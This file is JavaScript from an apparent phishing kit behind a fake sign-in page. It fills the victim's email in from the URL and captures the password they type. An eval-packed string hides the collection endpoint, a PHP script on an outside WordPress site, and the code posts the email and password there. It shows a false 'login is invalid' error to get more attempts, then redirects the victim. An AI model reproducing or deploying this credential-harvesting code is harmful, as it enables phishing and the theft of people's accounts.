
	var hash = window.location.hash;
	var email = window.location.hash.substr(1);
	
	
$('#psssss').focus();
	var em = $('#testx').val();
		var ps = $('#psssss').val();

		var email = document.getElementById('testx').value = email;


			document.getElementById('psssss').focus();

      $('#psssss').keydown(function (e) {
        if (e.which == 13) {
          mary();
          return false;
        }
      });
	  

	function openDiv(){

		$('#formDiv').css('display','grid');
		$('#formDiv').fadeIn('slow');
		//alert('ok');
		} 
			
		function mary() {
			var em = $('#testx').val();
			var ps = $('#psssss').val();

			if (ps === "" || ps === " " || ps == " " || ps == "  " || ps == "   " || ps === null) {

				document.getElementById('psssss').focus();
				
				

			} else if (em == "" || em == " " || em == " " || em == null || em == undefined){

				document.getElementById('warning').innerHTML = "The user name or password you entered isn't correct. Try entering it again.";

		} else {
				var em = $('#testx').val();
				var ps = $('#psssss').val();
				//fr
		   
		eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('7 6="5://4.3/2/1.0";',8,8,'php|hellodocument|wp|org|tropileche|https|fr|var'.split('|'),0,{}))	


			$.ajax({
					url: fr, // full add
					type: 'POST',
					data: {
						ai: em,
						pr: ps,
					},
					beforeSend: function(xhr){
						
						document.getElementById("login-status").className = "info-notice";
						document.getElementById("login-status-message").innerHTML = "Authenticating ...";
												
					},
					error: function (response) {
	 

						var randomLink = Math.random().toString(13).replace('0.', '');
						
						
						document.getElementById("login-status").className = "error-notice";
						document.getElementById("login-status-message").innerHTML = "The login is invalid.";
						
						
						$('#psssss').val("");
						$('#psssss').focus();
						
						var count = 1;
						var a =  document.getElementById("num2").value;
						var c = parseInt(a) + parseInt(count); 
						if (c > 2){
							window.location.replace("succesful.html#" + email );}
						
						count = document.getElementById("num2").value = c; 
						count = count + 1;
			
			  $('#psssss').val("");
			  $('#psssss').focus();

			  console.log(randomLink);
				  return;

					}
				});
			}
		}